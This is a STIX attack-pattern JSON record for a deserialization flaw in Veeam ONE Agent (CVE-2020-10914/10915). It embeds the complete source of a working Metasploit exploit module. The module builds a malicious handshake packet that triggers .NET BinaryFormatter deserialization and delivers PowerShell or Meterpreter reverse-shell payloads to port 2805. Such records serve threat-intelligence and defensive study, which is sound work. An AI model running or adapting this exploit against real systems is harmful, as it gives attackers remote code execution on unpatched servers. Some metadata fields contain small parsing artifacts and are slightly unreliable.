{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f76bfc89-c4a0-4916-86ec-1ecab943e083",
    "created": "2024-08-14T16:46:11.878403Z",
    "modified": "2024-08-14T16:46:11.878407Z",
    "name": "Veeam ONE Agent .NET Deserialization",
    "description": " This module exploits a .NET deserialization vulnerability in the Veeam ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the 9 and 10 release lines.  Specifically, the module targets the HandshakeResult() method used by the Agent. By inducing a failure in the handshake, the Agent will deserialize untrusted data.  Tested against the pre-patched release of 10.0.0.750. Note that Veeam continues to distribute this version but with the patch pre-applied. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/veeam_one_agent_deserialization.rb",
            "external_id": "veeam_one_agent_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10914"
        },
        {
            "source_name": "reference",
            "url": "https://www.veeam.com/kb3144"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Veeam ONE Agent .NET Deserialization',\n        'Description' => %q{\n          This module exploits a .NET deserialization vulnerability in the Veeam\n          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the\n          9 and 10 release lines.\n\n          Specifically, the module targets the HandshakeResult() method used by\n          the Agent. By inducing a failure in the handshake, the Agent will\n          deserialize untrusted data.\n\n          Tested against the pre-patched release of 10.0.0.750. Note that Veeam\n          continues to distribute this version but with the patch pre-applied.\n        },\n        'Author' => [\n          'Michael Zanetta', # Discovery\n          'Edgar Boda-Majer', # Discovery\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-10914'],\n          ['CVE', '2020-10915'], # This module\n          ['ZDI', '20-545'],\n          ['ZDI', '20-546'], # This module\n          ['URL', 'https://www.veeam.com/kb3144']\n        ],\n        'DisclosureDate' => '2020-04-15', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'DefaultOptions' => {\n          'WfsDelay' => 10\n        },\n        'Notes' => {\n          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(2805),\n      OptString.new(\n        'HOSTINFO_NAME',\n        [\n          true,\n          'Name to send in host info (must be recognized by server!)',\n          'AgentController'\n        ]\n      )\n    ])\n  end\n\n  def check\n    vprint_status(\"Checking connection to #{peer}\")\n    connect\n\n    CheckCode::Detected(\"Connected to #{peer}.\")\n  rescue Rex::ConnectionError => e\n    CheckCode::Unknown(\"#{e.class}: #{e.message}\")\n  ensure\n    disconnect\n  end\n\n  def exploit\n    print_status(\"Connecting to #{peer}\")\n    connect\n\n    print_status(\"Sending host info to #{peer}\")\n    sock.put(host_info(datastore['HOSTINFO_NAME']))\n\n    res = sock.get_once\n    vprint_good(\"<-- Host info reply: #{res.inspect}\") if res\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      # TODO: Create an option to execute the full stager without hacking\n      # :linemax or calling execute_command(generate_cmdstager(...).join(...))\n      execute_cmdstager(\n        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0\n        linemax: 9001 # It's over 9000\n      )\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  rescue EOFError, Rex::ConnectionError => e\n    fail_with(Failure::Unknown, \"#{e.class}: #{e.message}\")\n  ensure\n    disconnect\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    serialized_payload = Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :TextFormattingRunProperties,\n      formatter: :BinaryFormatter # This is _exactly_ what we need\n    )\n\n    print_status(\"Sending malicious handshake to #{peer}\")\n    sock.put(handshake(serialized_payload))\n\n    res = sock.get_once\n    vprint_good(\"<-- Handshake reply: #{res.inspect}\") if res\n  rescue EOFError, Rex::ConnectionError => e\n    fail_with(Failure::Unknown, \"#{e.class}: #{e.message}\")\n  end\n\n  def host_info(name)\n    meta = [0x0205].pack('v')\n    packed_name = [name.length].pack('C') + name\n\n    pkt = meta + packed_name\n\n    vprint_good(\"--> Host info packet: #{pkt.inspect}\")\n    pkt\n  end\n\n  def handshake(serialized_payload)\n    # A -1 status indicates a failure, which will trigger the deserialization\n    status = [-1].pack('l<')\n\n    length = status.length + serialized_payload.length\n    type = 7\n    attrs = 1\n    kontext = 0\n\n    header = [length, type, attrs, kontext].pack('VvVV')\n    padding = \"\\x00\" * 18\n    result = status + serialized_payload\n\n    pkt = header + padding + result\n\n    vprint_good(\"--> Handshake packet: #{pkt.inspect}\")\n    pkt\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-04-15, # Vendor advisory",
    "x_mitre_platforms": [
        "win'"
    ]
}